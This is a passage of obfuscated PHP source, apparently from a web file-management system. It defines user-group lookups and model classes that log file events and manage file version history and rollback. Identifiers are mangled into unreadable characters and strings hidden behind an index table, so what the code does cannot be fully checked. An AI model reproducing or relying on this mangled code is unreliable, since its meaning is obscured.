$‘ıÛî‘; $ÔË×œ° = $‹¬Ğ¯ˆ±; $£»Ã°Ğò = $÷³Õè†ñ; $§²ÎÆÚ£ = $ƒÒ™Ú¥; } if ($‘ıÛî‘ == $ş€Á£óÇ && $‹¬Ğ¯ˆ± >= $ÔË×œ°) { $ÔË×œ° = $‹¬Ğ¯ˆ±; $£»Ã°Ğò = $÷³Õè†ñ; $§²ÎÆÚ£ = $ƒÒ™Ú¥; } } else { if ($ƒÒ™Ú¥ == $ÖÍûıç«[228]) { $Œ§²’‰° = !0; $³Ô±é¿ = $÷³Õè†ñ; $·£‘›µ™ = $‹¬Ğ¯ˆ±; } } } } if ($¤äß·Æ) { $Î…¸—èˆ = $Ó¥İ…Šı; $÷³Õè†ñ = $ò Â…Âé; $±Ğøûúµ = LNG($ÖÍûıç«[2197]); } else { if ($Î´Âá ¼) { $Î…¸—èˆ = $ÔË×œ°; $÷³Õè†ñ = $£»Ã°Ğò; $ë¶§Ìó = Model($ÖÍûıç«[585])->getInfo($§²ÎÆÚ£); $±Ğøûúµ = $ÖÍûıç«[176] . $ë¶§Ìó[$ÖÍûıç«[589]] . $ÖÍûıç«[2198] . LNG($ÖÍûıç«[2199]); } else { if ($Œ§²’‰°) { $Î…¸—èˆ = $·£‘›µ™; $÷³Õè†ñ = $³Ô±é¿; $±Ğøûúµ = LNG($ÖÍûıç«[2169]); } else { $Î…¸—èˆ = 0; $÷³Õè†ñ = !1; $±Ğøûúµ = $ÖÍûıç«[12]; } } } $”ªœ®¡Ú = array($ÖÍûıç«[2189] => intval($Î…¸—èˆ), $ÖÍûıç«[2172] => $÷³Õè†ñ, $ÖÍûıç«[2190] => $±Ğøûúµ, $ÖÍûıç«[2181] => $ö¤÷øàŒ[$ÖÍûıç«[193]]); return $”ªœ®¡Ú; } private function groupContainUser($üÈ±±ã´, $³ìÇŞ¨… = false) { return in_array($üÈ±±ã´, $this->userGroupParents($³ìÇŞ¨…)); } private function groupStepToUserGroup($ßìÔ¿ıø, $½…¿”¨„ = false) { $§şÊÆ£ =& $_SERVER[Ùæõ‰Ï’]; $—œ«ğª = $this->userGroupList($½…¿”¨„); $©¢„İî = 1000; $ùôÍıéá = $GLOBALS[$§şÊÆ£[6]][$§şÊÆ£[92]][$§şÊÆ£[2086]] == 1; $áÍğü“ˆ = $ùôÍıéá ? 3 : 2; foreach ($—œ«ğª as $³¡«ü…) { if ($³¡«ü…[$§şÊÆ£[1979]] == $ßìÔ¿ıø) { return 0; } $˜¨Êš‘¼ = explode($§şÊÆ£[50], trim($³¡«ü…[$§şÊÆ£[584]], $§şÊÆ£[50])); if ($˜¨Êš‘¼[0] == $§şÊÆ£[228] && count($˜¨Êš‘¼) > $áÍğü“ˆ) { $Ö­ÂìÂ¯ = array_reverse(array_slice($˜¨Êš‘¼, $áÍğü“ˆ)); $¯’™í¤ü = array_search($ßìÔ¿ıø, $Ö­ÂìÂ¯); if ($¯’™í¤ü !== !1 && $¯’™í¤ü + 1 <= $©¢„İî) { $©¢„İî = $¯’™í¤ü + 1; } } } return $©¢„İî; } private function userGroupList($ÌŞ¨§Áû = false) { $……şÄ­ =& $_SERVER[Ùæõ‰Ï’]; static $Œòµ•ô¢ = array(); if (isset($Œòµ•ô¢[$ÌŞ¨§Áû])) { return $Œòµ•ô¢[$ÌŞ¨§Áû]; } $§±…‡ÈŠ = Model($……şÄ­[598])->getInfo($ÌŞ¨§Áû); $Œòµ•ô¢[$ÌŞ¨§Áû] = array_to_keyvalue($§±…‡ÈŠ[$……şÄ­[2170]], $……şÄ­[1979]); return $Œòµ•ô¢[$ÌŞ¨§Áû]; } public function userGroupParents($òß…‚ïƒ) { $ı¥¨Ÿï× =& $_SERVER[Ùæõ‰Ï’]; static $ÈĞËßŞÒ = array(); $òß…‚ïƒ = $òß…‚ïƒ ? $òß…‚ïƒ : USER_ID; if (isset($ÈĞËßŞÒ[$òß…‚ïƒ])) { return $ÈĞËßŞÒ[$òß…‚ïƒ]; } $´ƒÊÏ— = $this->userGroupList($òß…‚ïƒ); $™˜‡æÏ = array(); $Ê±¸€Š = $GLOBALS[$ı¥¨Ÿï×[6]][$ı¥¨Ÿï×[92]][$ı¥¨Ÿï×[2086]] == 1; $Üäî±“í = $Ê±¸€Š ? 3 : 2; foreach ($´ƒÊÏ— as $·ÍÂİ¦õ) { $Á²¦®ì¶ = array($·ÍÂİ¦õ[$ı¥¨Ÿï×[1979]]); $½œšàø = explode($ı¥¨Ÿï×[50], trim($·ÍÂİ¦õ[$ı¥¨Ÿï×[584]], $ı¥¨Ÿï×[50])); if ($½œšàø[0] == $ı¥¨Ÿï×[228] && count($½œšàø) > $Üäî±“í) { $†œ¦Òâ¿ = array_slice($½œšàø, $Üäî±“í); $Á²¦®ì¶ = array_merge($Á²¦®ì¶, array_reverse($†œ¦Òâ¿)); } $™˜‡æÏ = array_merge($™˜‡æÏ, $Á²¦®ì¶); } $ÈĞËßŞÒ[$òß…‚ïƒ] = array_unique($™˜‡æÏ); return $ÈĞËßŞÒ[$òß…‚ïƒ]; } public function authTargetInfoMake($½ü¦›¥) { $‚æÆƒİÌ =& $_SERVER[Ùæõ‰Ï’]; $§š®€¡« = array(); $é¯ßæÛ´ = array(); foreach ($½ü¦›¥ as $›û¿êá­) { if ($›û¿êá­[$‚æÆƒİÌ[190]] == SourceModel::TYPE_USER) { $§š®€¡«[] = intval($›û¿êá­[$‚æÆƒİÌ[569]]); } else { if ($›û¿êá­[$‚æÆƒİÌ[190]] == SourceModel::TYPE_GROUP) { $é¯ßæÛ´[] = intval($›û¿êá­[$‚æÆƒİÌ[569]]); } } } if ($§š®€¡«) { $§š®€¡« = Model($‚æÆƒİÌ[577])->userListInfo($§š®€¡«); } if ($é¯ßæÛ´) { $Õó«¼ƒİ = array($‚æÆƒİÌ[2071] => array($‚æÆƒİÌ[492], $é¯ßæÛ´)); $é¯ßæÛ´ = Model($‚æÆƒİÌ[585])->field($‚æÆƒİÌ[2200])->where($Õó«¼ƒİ)->select(); $é¯ßæÛ´ = array_to_keyvalue($é¯ßæÛ´, $‚æÆƒİÌ[1979]); } return array($‚æÆƒİÌ[2201] => $§š®€¡«, $‚æÆƒİÌ[2202] => $é¯ßæÛ´); } public function authInfo($ı¿åëÚ³) { $ıùìË‹ï =& $_SERVER[Ùæõ‰Ï’]; if ($ı¿åëÚ³[$ıùìË‹ï[2087]]) { $ËÍ…±ëö = Model($ıùìË‹ï[571])->listData($ı¿åëÚ³[$ıùìË‹ï[2087]]); if (!$ËÍ…±ëö) { return !1; $Ì÷Ûğ¦— = Model($ıùìË‹ï[571])->listData(); $İºòëÈ = array_filter_by_field($Ì÷Ûğ¦—, $ıùìË‹ï[487], $ıùìË‹ï[228]); return $İºòëÈ; } $À”„¨×ú = array_field_key($ËÍ…±ëö, array($ıùìË‹ï[475], $ıùìË‹ï[32], $ıùìË‹ï[487], $ıùìË‹ï[2002], $ıùìË‹ï[2003])); $À”„¨×ú[$ıùìË‹ï[2203]] = $ı¿åëÚ³; return $À”„¨×ú; } else { return array($ıùìË‹ï[493] => 0, $ıùìË‹ï[1985] => $ı¿åëÚ³[$ıùìË‹ï[2147]], $ıùìË‹ï[494] => $ıùìË‹ï[12], $ıùìË‹ï[2002] => $ıùìË‹ï[2204]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\157\137\163\157\165\162\x63\x65\x5f\x65\x76\x65\156\164"; protected $dataAuto = array(array("\143\162\x65\x61\x74\x65\x54\151\155\x65", "\164\x69\x6d\145", "\151\156\163\145\x72\164", "\x66\165\156\x63\164\x69\x6f\x6e"), array("\144\x65\163\143", '', "\151\x6e\163\x65\x72\x74\54\x75\x70\144\141\164\x65\x2c\163\145\154\x65\143\x74", "\x6a\163\157\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($îİ÷Á¬, $´Ö‚Ğ–¤, $Ú‚ã´˜µ = '') { $Ğ››Éß =& $_SERVER[Ùæõ‰Ï’]; if (!$this->eventSave) { return; } $¯¥˜Ò¼ = Model($Ğ››Éß[1430])->sourceInfo($îİ÷Á¬); if (!$¯¥˜Ò¼) { return !1; } if ($this->isDisableEvent($¯¥˜Ò¼, $´Ö‚Ğ–¤)) { return; } if ($Ú‚ã´˜µ && is_string($Ú‚ã´˜µ)) { $Ú‚ã´˜µ = array($Ğ››Éß[2018] => $Ú‚ã´˜µ); } $àü«ñç± = defined($Ğ››Éß[2205]) ? USER_ID : 0; $şÇÄŒöƒ = array($Ğ››Éß[491] => $îİ÷Á¬, $Ğ››Éß[2206] => $¯¥˜Ò¼[$Ğ››Éß[192]], $Ğ››Éß[2207] => $¯¥˜Ò¼[$Ğ››Éß[32]], $Ğ››Éß[582] => !empty($¯¥˜Ò¼[$Ğ››Éß[582]]) ? $¯¥˜Ò¼[$Ğ››Éß[582]] : $Ğ››Éß[12], $Ğ››Éß[1772] => $àü«ñç±, $Ğ››Éß[496] => $´Ö‚Ğ–¤, $Ğ››Éß[1774] => $Ú‚ã´˜µ); $this->addSystemLog($´Ö‚Ğ–¤, $şÇÄŒöƒ); unset($şÇÄŒöƒ[$Ğ››Éß[2207]], $şÇÄŒöƒ[$Ğ››Éß[582]]); return $this->add($şÇÄŒöƒ); } private function addSystemLog($òÈ¼ªîº, $ğñ­Æ’ë) { $õ¨›«°ö =& $_SERVER[Ùæõ‰Ï’]; if ($òÈ¼ªîº == $õ¨›«°ö[2208]) { $òÈ¼ªîº = $ğñ­Æ’ë[$õ¨›«°ö[526]][$õ¨›«°ö[2209]]; } else { if (in_array($òÈ¼ªîº, array($õ¨›«°ö[1959], $õ¨›«°ö[2210]))) { $òÈ¼ªîº = $ğñ­Æ’ë[$õ¨›«°ö[526]][$õ¨›«°ö[171]]; } } $ÀÈØ»œŸ = array_merge($ğñ­Æ’ë, array($õ¨›«°ö[2211] => $ğñ­Æ’ë[$õ¨›«°ö[193]], $õ¨›«°ö[2212] => $ğñ­Æ’ë[$õ¨›«°ö[2212]])); Hook::trigger($õ¨›«°ö[2213], $õ¨›«°ö[2214] . $òÈ¼ªîº, $ğñ­Æ’ë); Model($õ¨›«°ö[1923])->addLog($õ¨›«°ö[2214] . $òÈ¼ªîº, $ÀÈØ»œŸ); } private function isDisableEvent($Ã¦È‡é, $ı­ÎßÍÄ) { $çáßÁ =& $_SERVER[Ùæõ‰Ï’]; if ($Ã¦È‡é[$çáßÁ[190]] != SourceModel::TYPE_SYSTEM) { return !1; } if ($ı­ÎßÍÄ == $çáßÁ[1948]) { return !1; } return !0; } public function eventCreate($ ô•²½‡, $ìÚ…ãóƒ) { $Ó««ÕÙÔ =& $_SERVER[Ùæõ‰Ï’]; $½ÀŞõéÀ = Model($Ó««ÕÙÔ[1430])->sourceInfo($ ô•²½‡); $¶ÑÚäŸ = array($Ó««ÕÙÔ[2209] => $ìÚ…ãóƒ, $Ó««ÕÙÔ[32] => $½ÀŞõéÀ[$Ó««ÕÙÔ[32]]); return $this->addEvent($ ô•²½‡, $Ó««ÕÙÔ[2208], $¶ÑÚäŸ); } public function eventFileEdit($ç¾ùáÂ) { $ÍŞè¹çÎ =& $_SERVER[Ùæõ‰Ï’]; $œ€‘Éï¸ = array($ÍŞè¹çÎ[2215] => $_SERVER[$ÍŞè¹çÎ[2216]], $ÍŞè¹çÎ[2217] => strtolower(ACTION)); if (isset($GLOBALS[$ÍŞè¹çÎ[7]][$ÍŞè¹çÎ[2218]])) { $œ€‘Éï¸[$ÍŞè¹çÎ[2218]] = $ÍŞè¹çÎ[91]; } return $this->addEvent($ç¾ùáÂ, $ÍŞè¹çÎ[1949], $œ€‘Éï¸); } public function eventRecycle($àâ¡øåş, $Ğôè²ú÷) { return $this->addEvent($àâ¡øåş, $_SERVER[Ùæõ‰Ï’][2210], $Ğôè²ú÷); } private static $_removeLast = ''; public function eventRemove($™ü¦áÒ) { $‘ÕÃõ¦³ =& $_SERVER[Ùæõ‰Ï’]; self::$_removeLast = $™ü¦áÒ; $íµï²›° = Model($‘ÕÃõ¦³[1430])->sourceInfo($™ü¦áÒ); $ÚµãèÈˆ = array_field_key($íµï²›°, array($‘ÕÃõ¦³[193], $‘ÕÃõ¦³[541], $‘ÕÃõ¦³[505], $‘ÕÃõ¦³[584])); $ş¿¼Î°— = array($‘ÕÃõ¦³[171] => $íµï²›°[$‘ÕÃõ¦³[32]], $‘ÕÃõ¦³[2217] => ACTION, $‘ÕÃõ¦³[2219] => $ÚµãèÈˆ); return $this->addEvent($íµï²›°[$‘ÕÃõ¦³[192]], $‘ÕÃõ¦³[1948], $ş¿¼Î°—); } public function eventShare($¦æçÒ¢Ö, $ûÂˆ§™Û) { return $this->addEvent($¦æçÒ¢Ö, $_SERVER[Ùæõ‰Ï’][1959], $ûÂˆ§™Û); } public function eventMove($ÜÁİã˜Ç, $Ûòœ°—æ, $«ë»°³) { $Š¥Öò“ˆ =& $_SERVER[Ùæõ‰Ï’]; if (self::$_removeLast == $ÜÁİã˜Ç) { return; } $Íºáßı = Model($Š¥Öò“ˆ[1430]); $ÈÄÑŠ†Ñ = $Íºáßı->sourceInfo($ÜÁİã˜Ç); $•âà¢í» = $Íºáßı->sourceInfo($Ûòœ°—æ); $Àª¨½³ = $Íºáßı->sourceInfo($«ë»°³); $’µ¡Šëº = array($Š¥Öò“ˆ[1254] => $Ûòœ°—æ, $Š¥Öò“ˆ[2220] => $•âà¢í»[$Š¥Öò“ˆ[32]], $Š¥Öò“ˆ[2196] => !empty($•âà¢í»[$Š¥Öò“ˆ[582]]) ? $•âà¢í»[$Š¥Öò“ˆ[582]] : $Š¥Öò“ˆ[12], $Š¥Öò“ˆ[1255] => $«ë»°³, $Š¥Öò“ˆ[2221] => $Àª¨½³[$Š¥Öò“ˆ[32]], $Š¥Öò“ˆ[2222] => !empty($Àª¨½³[$Š¥Öò“ˆ[582]]) ? $Àª¨½³[$Š¥Öò“ˆ[582]] : $Š¥Öò“ˆ[12]); $this->addEvent($ÜÁİã˜Ç, $Š¥Öò“ˆ[620], $’µ¡Šëº); $ÈÄÑŠ†Ñ = $Íºáßı->sourceInfo($ÜÁİã˜Ç); $’µ¡Šëº = array($Š¥Öò“ˆ[193] => $ÈÄÑŠ†Ñ[$Š¥Öò“ˆ[193]], $Š¥Öò“ˆ[32] => $ÈÄÑŠ†Ñ[$Š¥Öò“ˆ[32]]); $this->addEvent($Ûòœ°—æ, $Š¥Öò“ˆ[2223], $’µ¡Šëº); } public function eventCopy($­¿ğãëí) { $this->eventCreate($­¿ğãëí, $_SERVER[Ùæõ‰Ï’][618]); } public function eventRename($¯Ä¥Ôü, $ÜÙƒ—Şà, $¢æÂœŒ¹) { $Î¨¢£ú’ =& $_SERVER[Ùæõ‰Ï’]; $ºıú¶È = array($Î¨¢£ú’[1254] => $ÜÙƒ—Şà, $Î¨¢£ú’[1255] => $¢æÂœŒ¹); return $this->addEvent($¯Ä¥Ôü, $Î¨¢£ú’[1444], $ºıú¶È); } public function eventAddComment($ª£Ô–£‚, $­œòÉºİ) { return $this->addEvent($ª£Ô–£‚, $_SERVER[Ùæõ‰Ï’][2224], $­œòÉºİ); } public function eventAddDesc($œê­ØÈ°, $¾ö´áÍ) { return $this->addEvent($œê­ØÈ°, $_SERVER[Ùæõ‰Ï’][2225], $¾ö´áÍ); } public function listBySource($ÉıÜ‚¬«) { $ï±ó¬û =& $_SERVER[Ùæõ‰Ï’]; $¹‹õç = Model($ï±ó¬û[1430])->sourceInfo($ÉıÜ‚¬«); $¨×©üÀ = array($ï±ó¬û[491] => $ÉıÜ‚¬«); if ($¹‹õç[$ï±ó¬û[485]] == $ï±ó¬û[91]) { $ÏµÅá±¡ = Model($ï±ó¬û[1430])->listSearchChildren($ÉıÜ‚¬«, 20000); $ÏµÅá±¡[] = $ÉıÜ‚¬« . $ï±ó¬û[454]; $¨×©üÀ = array($ï±ó¬û[193] => array($ï±ó¬û[7], $ÏµÅá±¡)); } $ûæ¯çÙ© = $this->where($¨×©üÀ)->order($ï±ó¬û[2226])->selectPage(); if ($ûæ¯çÙ©[$ï±ó¬û[442]][$ï±ó¬û[443]] == 0) { $ûæ¯çÙ©[$ï±ó¬û[442]][$ï±ó¬û[443]] = 1; $ûæ¯çÙ©[$ï±ó¬û[445]] = array(array($ï±ó¬û[491] => $ÉıÜ‚¬«, $ï±ó¬û[2206] => $¹‹õç[$ï±ó¬û[192]], $ï±ó¬û[1772] => $¹‹õç[$ï±ó¬û[527]], $ï±ó¬û[496] => $ï±ó¬û[2227], $ï±ó¬û[497] => $¹‹õç[$ï±ó¬û[231]], $ï±ó¬û[1774] => $ï±ó¬û[12])); } return $this->eventListParse($ûæ¯çÙ©, $ÉıÜ‚¬«); } private function eventListParse($÷¡ãå‚’, $Ëƒ–òÜŸ) { $»ÒÃ° =& $_SERVER[Ùæõ‰Ï’]; $ÊŠ°Öş‰ = $÷¡ãå‚’[$»ÒÃ°[445]]; $£»¤¶Ì = array_to_keyvalue($ÊŠ°Öş‰, $»ÒÃ°[12], $»ÒÃ°[193]); $’„ŞÖÌï = array_to_keyvalue($ÊŠ°Öş‰, $»ÒÃ°[12], $»ÒÃ°[2212]); foreach ($ÊŠ°Öş‰ as $ı×¾ÇĞ) { $ñıôó‘¿ = $ı×¾ÇĞ[$»ÒÃ°[526]]; if ($ı×¾ÇĞ[$»ÒÃ°[33]] == $»ÒÃ°[620] && isset($ñıôó‘¿[$»ÒÃ°[1254]])) { $£»¤¶Ì[] = $ñıôó‘¿[$»ÒÃ°[1254]] . $»ÒÃ°[12]; $£»¤¶Ì[] = $ñıôó‘¿[$»ÒÃ°[1255]] . $»ÒÃ°[12]; } if ($ı×¾ÇĞ[$»ÒÃ°[33]] == $»ÒÃ°[2223] && isset($ñıôó‘¿[$»ÒÃ°[193]])) { $£»¤¶Ì[] = $ñıôó‘¿[$»ÒÃ°[193]] . $»ÒÃ°[12]; } } $£»¤¶Ì = array_merge($£»¤¶Ì, $’„ŞÖÌï, array($Ëƒ–òÜŸ . $»ÒÃ°[12])); $£»¤¶Ì = array_unique($£»¤¶Ì); $”ÕÅ§¯½ = array_unique(array_to_keyvalue($ÊŠ°Öş‰, $»ÒÃ°[12], $»ÒÃ°[1781])); $½ğéíÕ = Model($»ÒÃ°[598])->userListInfo($”ÕÅ§¯½); $ÇÅàò = Model($»ÒÃ°[907])->sourceListInfo($£»¤¶Ì, !0); foreach ($ÊŠ°Öş‰ as &$ı×¾ÇĞ) { if ($ı×¾ÇĞ[$»ÒÃ°[33]] == $»ÒÃ°[620] && isset($ı×¾ÇĞ[$»ÒÃ°[526]][$»ÒÃ°[1254]])) { $ı×¾ÇĞ[$»ÒÃ°[526]][$»ÒÃ°[1254]] = $ÇÅàò[$ı×¾ÇĞ[$»ÒÃ°[526]][$»ÒÃ°[1254]]]; $ı×¾ÇĞ[$»ÒÃ°[526]][$»ÒÃ°[1255]] = $ÇÅàò[$ı×¾ÇĞ[$»ÒÃ°[526]][$»ÒÃ°[1255]]]; } if ($ı×¾ÇĞ[$»ÒÃ°[33]] == $»ÒÃ°[2223] && isset($ı×¾ÇĞ[$»ÒÃ°[526]][$»ÒÃ°[193]])) { $ı×¾ÇĞ[$»ÒÃ°[526]][$»ÒÃ°[193]] = $ÇÅàò[$ı×¾ÇĞ[$»ÒÃ°[526]][$»ÒÃ°[193]]]; } $ı×¾ÇĞ[$»ÒÃ°[90]] = $ÇÅàò[$ı×¾ÇĞ[$»ÒÃ°[193]]]; $ı×¾ÇĞ[$»ÒÃ°[2228]] = $ÇÅàò[$ı×¾ÇĞ[$»ÒÃ°[2212]]]; if ($ı×¾ÇĞ[$»ÒÃ°[33]] == $»ÒÃ°[1948]) { $ı×¾ÇĞ[$»ÒÃ°[2228]] = $ı×¾ÇĞ[$»ÒÃ°[90]]; $ı×¾ÇĞ[$»ÒÃ°[2212]] = $ı×¾ÇĞ[$»ÒÃ°[2228]][$»ÒÃ°[193]]; $ı×¾ÇĞ[$»ÒÃ°[90]] = !1; $ı×¾ÇĞ[$»ÒÃ°[193]] = $»ÒÃ°[12]; } $ı×¾ÇĞ[$»ÒÃ°[2155]] = $½ğéíÕ[$ı×¾ÇĞ[$»ÒÃ°[1781]]]; } unset($ı×¾ÇĞ); $÷¡ãå‚’[$»ÒÃ°[445]] = $ÊŠ°Öş‰; return $÷¡ãå‚’; } public function removeBySource($ˆÙÕŞ) { $›“Ïê§ = array($_SERVER[Ùæõ‰Ï’][491] => $ˆÙÕŞ); $this->where($›“Ïê§)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\x6f\x5f\163\157\x75\162\x63\x65\137\x68\x69\x73\x74\x6f\162\x79"; public function historyCount($®ê•³¢À) { $ˆ›óƒœî =& $_SERVER[Ùæõ‰Ï’]; if (!$®ê•³¢À) { return array(); } if (is_string($®ê•³¢À) || is_int($®ê•³¢À)) { $®ê•³¢À = array($®ê•³¢À); } $ø‚‰¸¦ = array($ˆ›óƒœî[193], $ˆ›óƒœî[2012] => $ˆ›óƒœî[565]); $˜ù£¾Ûş = array($ˆ›óƒœî[193] => array($ˆ›óƒœî[7], $®ê•³¢À)); $ë’«áèµ = $this->field($ø‚‰¸¦)->where($˜ù£¾Ûş)->group($ˆ›óƒœî[193])->select(); return array_to_keyvalue($ë’«áèµ, $ˆ›óƒœî[193], $ˆ›óƒœî[565]); } public function addHistory($Ã›™œ, $ê¼ûÂƒ = '') { $çõæÊ¸ =& $_SERVER[Ùæõ‰Ï’]; $¬§¨ºÙ = array($çõæÊ¸[491] => $Ã›™œ[$çõæÊ¸[193]], $çõæÊ¸[1772] => isset($Ã›™œ[$çõæÊ¸[529]]) ? $Ã›™œ[$çõæÊ¸[529]] : $Ã›™œ[$çõæÊ¸[527]], $çõæÊ¸[542] => $Ã›™œ[$çõæÊ¸[541]], $çõæÊ¸[617] => $Ã›™œ[$çõæÊ¸[79]], $çõæÊ¸[2229] => $ê¼ûÂƒ); if ($GLOBALS[$çõæÊ¸[6]][$çõæÊ¸[92]][$çõæÊ¸[1315]] >= 1) { $this->historyAutoClear($¬§¨ºÙ[$çõæÊ¸[193]]); $this->add($¬§¨ºÙ); } Hook::trigger($çõæÊ¸[2230], $¬§¨ºÙ); Model($çõæÊ¸[2231])->eventFileEdit($Ã›™œ[$çõæÊ¸[193]]); } private function historyAutoClear($äùª¥ŒÆ) { $óÇ®ëç =& $_SERVER[Ùæõ‰Ï’]; $…ÙÅ¹çÆ = Model($óÇ®ëç[853])->get($óÇ®ëç[1337]); $”›”ı©¦ = intval($GLOBALS[$óÇ®ëç[6]][$óÇ®ëç[92]][$óÇ®ëç[1315]]); $ƒ¶¡Î· = $…ÙÅ¹çÆ == $óÇ®ëç[1338] ? min(5, $”›”ı©¦) : $”›”ı©¦; $ƒ¶¡Î· = $ƒ¶¡Î· <= 0 ? 0 : $ƒ¶¡Î· - 1; if ($ƒ¶¡Î· >= 499) { return; } $Í±¤¹” = array($óÇ®ëç[491] => $äùª¥ŒÆ); $ ÇÊåº¿ = $this->field($óÇ®ëç[2232])->where($Í±¤¹”)->order($óÇ®ëç[2226])->select(); if (!$ ÇÊåº¿ || $ƒ¶¡Î· >= count($ ÇÊåº¿)) { return; } $¥Áªã„× = array_to_keyvalue($ ÇÊåº¿, $óÇ®ëç[12], $óÇ®ëç[475]); $¥Áªã„× = array_slice($¥Áªã„×, $ƒ¶¡Î·); $Ù‡È¡©¼ = array_to_keyvalue($ ÇÊåº¿, $óÇ®ëç[12], $óÇ®ëç[541]); $Ù‡È¡©¼ = array_slice($Ù‡È¡©¼, $ƒ¶¡Î·); if (!$¥Áªã„× || !$Ù‡È¡©¼) { return; } $Í±¤¹” = array($óÇ®ëç[493] => array($óÇ®ëç[7], $¥Áªã„×)); $this->where($Í±¤¹”)->delete(); Model($óÇ®ëç[544])->remove($Ù‡È¡©¼); } public function listData($¨²ˆê½â) { $ûŒÇ‘®Õ =& $_SERVER[Ùæõ‰Ï’]; $âíÏ¤áÔ = array($ûŒÇ‘®Õ[491] => $¨²ˆê½â); $ùµ‘îøï = $ûŒÇ‘®Õ[2233]; $Ñ‚ÀèüÒ = $this->field($ùµ‘îøï)->where($âíÏ¤áÔ)->order($ûŒÇ‘®Õ[2226])->selectPage(); $this->_listAppendUser($Ñ‚ÀèüÒ[$ûŒÇ‘®Õ[445]]); $ıˆÊ³ô£ = Model($ûŒÇ‘®Õ[853])->get($ûŒÇ‘®Õ[1337]); $óƒÇ¤á = 5; if ($ıˆÊ³ô£ == $ûŒÇ‘®Õ[1338]) { $Ñ‚ÀèüÒ[$ûŒÇ‘®Õ[445]] = array_slice($Ñ‚ÀèüÒ[$ûŒÇ‘®Õ[445]], 0, $óƒÇ¤á); $Ñ‚ÀèüÒ[$ûŒÇ‘®Õ[442]] = array($ûŒÇ‘®Õ[2234] => 1, $ûŒÇ‘®Õ[2235] => 20, $ûŒÇ‘®Õ[2236] => 1, $ûŒÇ‘®Õ[2237] => count($Ñ‚ÀèüÒ[$ûŒÇ‘®Õ[445]])); } return $Ñ‚ÀèüÒ; } protected function _listAppendUser(&$±ÜÍ÷Âé) { $«ğ¿îí =& $_SERVER[Ùæõ‰Ï’]; $ÄÄ”§Ã = array_to_keyvalue($±ÜÍ÷Âé, $«ğ¿îí[12], $«ğ¿îí[1781]); $øšÔß¡© = Model($«ğ¿îí[598])->userListInfo($ÄÄ”§Ã); foreach ($±ÜÍ÷Âé as &$Ö·ïËÄÊ) { $ÌÎ¤üâÎ = $Ö·ïËÄÊ[$«ğ¿îí[1781]]; $Ö·ïËÄÊ[$«ğ¿îí[527]] = $øšÔß¡©[$ÌÎ¤üâÎ] ? $øšÔß¡©[$ÌÎ¤üâÎ] : !1; } unset($Ö·ïËÄÊ); } public function fileInfo($ƒ‰ß”’‹) { $§‹’€Å£ =& $_SERVER[Ùæõ‰Ï’]; $³úËûâÈ = $this->tablePrefix; $ªÊ‹¦Ã¡ = "{$³úËûâÈ}\151\157\137\x66\x69\154\x65\x20\x66\151\x6c\145\x73\x20\157\156\40\146\151\154\145\163\x2e\146\151\x6c\145\111\x44\40\x3d\x20\150\151\x73\164\x6f\162\171\x2e\x66\151\154\x65\111\104"; return $this->alias($§‹’€Å£[2238])->where(array($§‹’€Å£[493] => $ƒ‰ß”’‹))->join($ªÊ‹¦Ã¡, $§‹’€Å£[2239])->find(); } public function removeItem($Ç·ƒ¬ìé) { $¸ÙšÁĞ¾ =& $_SERVER[Ùæõ‰Ï’]; $²…Ïâ—„ = array($¸ÙšÁĞ¾[493] => $Ç·ƒ¬ìé); $¦¡²àĞî = $this->where($²…Ïâ—„)->find(); if ($¦¡²àĞî) { $–Š§”í› = $this->where($²…Ïâ—„)->delete(); Model($¸ÙšÁĞ¾[544])->remove($¦¡²àĞî[$¸ÙšÁĞ¾[541]]); return $–Š§”í›; } return !1; } public function removeBySource($ï”„öÜ) { $İı²œøÛ =& $_SERVER[Ùæõ‰Ï’]; if (!$ï”„öÜ) { return !1; } if (!is_array($ï”„öÜ)) { $ï”„öÜ = array($ï”„öÜ); } $õÌ³öá = array($İı²œøÛ[491] => array($İı²œøÛ[7], $ï”„öÜ)); $ªš ˆ¬¦ = $this->field($İı²œøÛ[542])->where($õÌ³öá)->select(); if ($ªš ˆ¬¦) { $this->where($õÌ³öá)->delete(); $ŒæíÜ× = array_to_keyvalue($ªš ˆ¬¦, $İı²œøÛ[12], $İı²œøÛ[541]); Model($İı²œøÛ[544])->remove($ŒæíÜ×); } return !0; } public function setDetail($Ü‰¤‡éø, $Œä» ÚÒ) { $áú‘Ö¾¸ =& $_SERVER[Ùæõ‰Ï’]; return $this->where(array($áú‘Ö¾¸[493] => $Ü‰¤‡éø))->save(array($áú‘Ö¾¸[2229] => $Œä» ÚÒ)); } public function rollbackToItem($¬´«–³Ê, $Àş–ìŠ’) { $‰¹î§Ü¹ =& $_SERVER[Ùæõ‰Ï’]; $“ï®§ìé = Model($‰¹î§Ü¹[907])->sourceInfo($¬´«–³Ê); $this->addHistory($“ï®§ìé, LNG($‰¹î§Ü¹[2240])); $ó ²êä® = $this->find($Àş–ìŠ’); $à¼íœúá = array($‰¹î§Ü¹[541] => $ó ²êä®[$‰¹î§Ü¹[541]], $‰¹î§Ü¹[79] => $ó ²êä®[$‰¹î§Ü¹[79]], $‰¹î§Ü¹[88] => time(), $‰¹î§Ü¹[529] => USER_ID); Model($‰¹î§Ü¹[907])->where(array($‰¹î§Ü¹[193] => $¬´«–³Ê))->save($à¼íœúá); return $this->where(array($‰¹î§Ü¹[493] => $Àş–ìŠ’))->delete(); } public function clearSame($Éáç–ÍÊ) { $šó•ºÅ‹ =& $_SERVER[Ùæõ‰Ï’]; $‚éËÅ£§ = $this->listData($Éáç–ÍÊ); $õòß„Ë² = array_to_keyvalue_group($‚éËÅ£§, $šó•ºÅ‹[541]); $ÊŸĞ•Ÿœ = array(); $šÕ’¡„› = array(); foreach ($õòß„Ë² as $æŠ®ÅË ) { if (!$æŠ®ÅË  || count($æŠ®ÅË ) <= 1) { continue; } foreach ($æŠ®ÅË  as $ñ’„Ç³â) { $ÊŸĞ•Ÿœ[] = $ñ’„Ç³â[$šó•ºÅ‹[541]]; $šÕ’¡„›[] = $ñ’„Ç³â[$šó•ºÅ‹[475]]; } } if (!$šÕ’¡„›) { return; } $this->where(array($šó•ºÅ‹[475] => array($šó•ºÅ‹[7], $šÕ’¡„›)))->delete(); Model($šó•ºÅ‹[544])->remove($ÊŸĞ•Ÿœ); } public function userSpace() { $´´û­İ =& $_SERVER[Ùæõ‰Ï’]; $åÓœÏÜ = $this->tablePrefix; $È©³Ü± = array($´´û­İ[1772] => USER_ID); 